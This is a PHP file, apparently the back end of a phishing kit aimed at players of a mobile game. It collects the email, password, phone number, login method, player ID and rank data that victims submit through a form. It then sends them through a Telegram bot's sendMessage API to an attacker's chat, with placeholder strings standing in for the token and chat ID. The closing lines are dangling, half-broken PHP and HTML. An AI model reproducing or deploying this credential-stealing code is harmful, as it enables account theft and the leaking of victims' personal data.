<?php
// MENGAMBIL KONTROL
include 'system/setting.php';
include 'system/geolocation.php';
include 'system/get_flag.php';
include 'system/serverrequest.php';
include 'system/get_callingcode.php';
include 'email.php';

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];
$playid = $_POST['playid'];
$nick = $_POST['nick'];
$phone = $_POST['phone'];
$level = $_POST['level'];
$tier = $_POST['tier'];
$rpt = $_POST['rpt'];
$rpl = $_POST['rpl'];
$platform = $_POST['platform'];

$apiToken = "توكككككككككككككككن";
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$from_id = $message->from->id;
$chat_id = $message->chat->id;
$text = $message->text;
$name = $message->from->first_name;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$data = $update->callback_query->data;
$user = $_GET["username"];
$chat = "اااااااييييييييييدددددددددييييييييي";
$data = [
    'chat_id' => $chat,
    'text' => "
•  Email :- $email
•  Pass  :- $password
•  Tell.U :- $phone
•  Login :- $login
•  PlayID:- $playid
•  Level  :- $level
•  IP        :- $ip
•  Point  :- $tier
•  RP.T    :- $rpt
•  RP.L    :- $rpl
•  Hand  :- $platform"
];


$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

?>

if($kirim) {
echo "<form id='arpantek' method='POST' action='processing.php'>
<input type='hidden' name='nick' value='$nick'>
</form>
<script type='text/javascript'>document.getElementById('arpantek').submit();</script>";
}

  </head> 
  <body> 
  </body> 
</html>
